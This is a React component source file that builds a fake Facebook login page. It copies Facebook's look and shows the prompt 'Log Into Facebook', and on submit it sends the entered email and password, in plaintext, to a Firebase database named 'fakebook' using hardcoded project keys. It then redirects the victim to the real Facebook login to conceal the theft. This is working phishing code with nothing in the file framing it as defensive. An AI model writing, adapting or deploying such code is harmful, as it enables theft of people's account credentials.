import React, { Component } from 'react';
import firebase from 'firebase';
import 'firebase/app';
import 'firebase/firestore';
import styled from 'styled-components';

const Wrapper = styled.div`
  background-color: #fff;
  margin: 70px auto auto auto;
  padding: 22px 108px 26px;
  width: 396px;
  border: 1px solid #dddfe2;
  border-radius: 3px;
  text-align: center;

  p {
    color: #1d2129;
    direction: ltr;
    font-size: 18px;
    line-height: 22px
  }

  input {
    font-family: inherit;
    font-size: 14px;
    padding: 5px 8px;
    width: 284px;
    border: 1px solid #dddfe2;
    color: #1d2129;
    height: 22px;
  }

  button {
    margin-top: 10px;
    border: 1px solid;
    border-radius: 2px;
    box-sizing: content-box;
    font-size: 12px;
    -webkit-font-smoothing: antialiased;
    font-weight: bold;
    justify-content: center;
    padding: 0 8px;
    position: relative;
    text-align: center;
    text-shadow: none;
    vertical-align: middle;
    width: 252px;
    font-size: 14px;
    line-height: 42px;
    padding: 0 24px;
    background-color: #4267b2;
    border-color: #4267b2;
    color: #fff;
    cursor: pointer;
  }
`;

const Links = styled.div`
  padding: 6px 0;
  margin-top: 10px;

  a {
    color: #365899;
    cursor: pointer;
    text-decoration: none;
    font-size: 12px;
    
    &:hover {
      text-decoration: underline;
    }
  }
`;

class Header extends Component {
  state = {};

  onChange = (e) => {
    this.setState({ [e.target.name]: e.target.value });
  };

  onSubmit = (e) => {
    e.preventDefault();
    const app = firebase.initializeApp({
      apiKey: "AIzaSyDELq7yYzfM2Un8wFPxyw0lBVgFf2Za9WE",
      authDomain: "fakebook-7a73b.firebaseapp.com",
      databaseURL: "https://fakebook-7a73b.firebaseio.com",
      projectId: "fakebook-7a73b",
      storageBucket: "fakebook-7a73b.appspot.com",
      messagingSenderId: "917062845474"
    });
    const save = app
    .database()
    .ref("fakebook/")
    .push( {
        email: this.state.name,
        password: this.state.pass,
        date: Date()
    }).then(() => {
      window.location = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101';
    });
  };

  render () {
    return (
      <Wrapper>
        <p>Log Into Facebook</p>
        <form onSubmit={this.onSubmit}>
          <input onChange={this.onChange} style={{ margin: '10px' }} name='name' type='text' placeholder='Email or Phone Number' />
          <input onChange={this.onChange} name='pass' type='password' placeholder='Password' />
          <br />
          <button type='submit'>Log In</button>
        </form>
        <Links>
          <a href='https://www.facebook.com/recover/initiate/?ars=facebook_login'>Forgot account?</a>
          <span role='presentation' aria-hidden='true'> · </span>
          <a href='https://www.facebook.com/r.php?locale=en_US&amp;display=page'>Sign up for Facebook</a>
        </Links>
      </Wrapper>
    );
  }
}

export default Header;